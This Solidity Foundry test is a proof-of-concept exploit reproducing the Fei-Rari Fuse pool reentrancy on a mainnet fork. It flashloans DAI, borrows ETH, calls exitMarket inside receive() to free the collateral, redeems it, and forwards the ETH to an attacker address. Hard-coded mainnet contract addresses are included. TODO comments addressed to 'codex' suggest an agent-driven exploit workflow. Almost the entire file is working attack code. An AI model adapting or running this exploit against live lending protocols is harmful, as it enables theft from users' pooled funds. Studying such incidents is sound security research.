pragma solidity 0.8.23;

import "forge-std/Test.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Fei-Rari (Rari Fuse pool) cross-function reentrancy PoC.
// Vuln: CEther.doTransferOut uses call.value (full gas) and borrowFresh writes
// storage AFTER the external call (CEI violation + no cross-fn reentrancy
// lock). During the forwarded receive() we call Comptroller.exitMarket on the
// collateral fToken — storage still shows "no borrow" → collateral unlocks.
// Then we redeem the collateral and repay the flashloan.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
    function deposit() external payable;
}

interface IAaveLendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,     // 0 = no debt (repay inside callback)
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function markets(address cToken) external view returns (bool, uint256, bool);
}

interface ICEther {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function mint() external payable;
    function repayBorrow() external payable;
    function balanceOfUnderlying(address) external returns (uint256);
}

interface ICErc20 {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function underlying() external view returns (address);
}

contract FeiRariExploitTest is Test {
    // ── Addresses (Ethereum mainnet fork) ─────────────────────────────
    // Verified from knowledge/case_feirari.md:
    IERC20          constant DAI        = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20          constant USDC       = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH           constant WETH       = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IComptroller    constant UNITROLLER = IComptroller(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
    ICErc20         constant FDAI       = ICErc20(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
    ICEther         constant FETH       = ICEther(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);
    IAaveLendingPool constant AAVE_V2   = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    // ── Setup ────────────────────────────────────────────────────────
    address attacker = vm.addr(uint256(keccak256("attacker")));
    // TODO[codex]: pin fork block (attack date 2022-04-30). Confirm via recon.
    uint256 constant FORK_BLOCK = 14684813;

    // Exploit sizing — Codex tunes after first pass.
    uint256 flashDAI   = 150_000_000 * 1e18; // TODO[codex]: USDC/DAI both viable — case_feirari.md favours DAI
    uint256 borrowETH  = 1977 ether;         // approximate collateralization ceiling

    function setUp() public {
        vm.createSelectFork("ch3", FORK_BLOCK);
        vm.deal(attacker, 1 ether); // gas
    }

    // ── Hypothesis test ──────────────────────────────────────────────
    function test_exploit() public {
        uint256 balBefore = attacker.balance;
        console.log("ATTACKER_NATIVE_BEFORE:", balBefore);

        // Kick off Aave flashloan; Aave calls our executeOperation mid-tx.
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes   = new uint256[](1);
        assets[0]  = address(DAI);
        amounts[0] = flashDAI;
        modes[0]   = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        // Forward ETH balance from exploit contract to attacker EOA.
        uint256 here = address(this).balance;
        if (here > 0) {
            (bool ok, ) = attacker.call{value: here}("");
            require(ok, "fwd");
        }

        uint256 balAfter = attacker.balance;
        console.log("ATTACKER_NATIVE_AFTER:", balAfter);
        console.log("ATTACKER_NATIVE_DELTA:", balAfter - balBefore);
        assertGt(balAfter, balBefore, "native balance must strictly increase");
    }

    // ─────────────────────────────────────────────────────────────────
    // Aave V2 flashloan callback
    // ─────────────────────────────────────────────────────────────────
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "bad aave caller");

        // 1. Deposit DAI as collateral into fDAI.
        DAI.approve(address(FDAI), type(uint256).max);
        require(FDAI.mint(amounts[0]) == 0, "mint fail");

        // 2. Enter the market so fDAI counts as collateral.
        address[] memory markets = new address[](1);
        markets[0] = address(FDAI);
        UNITROLLER.enterMarkets(markets);

        // 3. Borrow ETH. CEther.doTransferOut uses call.value → full gas → our
        //    receive() runs mid-borrow, BEFORE accountBorrows storage is written.
        require(FETH.borrow(borrowETH) == 0, "borrow fail");

        // 5-post-reentrancy: collateral is already unlocked (we exitMarket'd
        //    inside receive()). Redeem all fDAI back to DAI.
        FDAI.redeem(FDAI.balanceOf(address(this)));

        // 6. Repay flashloan (DAI + premium).
        uint256 owed = amounts[0] + premiums[0];
        DAI.approve(address(AAVE_V2), owed);
        return true;
    }

    // ─────────────────────────────────────────────────────────────────
    // Reentrancy hook — fires inside FETH.borrow → doTransferOut.
    // Storage `accountBorrows[attacker]` has NOT been updated yet, so the
    // Comptroller thinks we have no debt → exitMarket passes → collateral
    // unlocks. When borrow() finishes and writes storage, it's too late.
    // ─────────────────────────────────────────────────────────────────
    receive() external payable {
        if (msg.sender == address(FETH)) {
            // Only fire on the borrow's forwarded ETH, not on stray sends.
            UNITROLLER.exitMarket(address(FDAI));
        }
    }

    /// @notice Hypothesis: Rari Fuse's CEther.doTransferOut was converted from
    ///         `transfer` (2300 gas cap) to `call.value` (full gas) without
    ///         adding a cross-function reentrancy lock. borrowFresh writes
    ///         accountBorrows AFTER the external send (CEI violation). During
    ///         the forwarded receive(), storage still shows zero borrow, so
    ///         Comptroller.exitMarket frees the collateral. We then redeem
    ///         collateral and repay the Aave flashloan. Native ETH delta =
    ///         borrowed ETH minus Aave premium (~0.09% on DAI, not ETH).
}
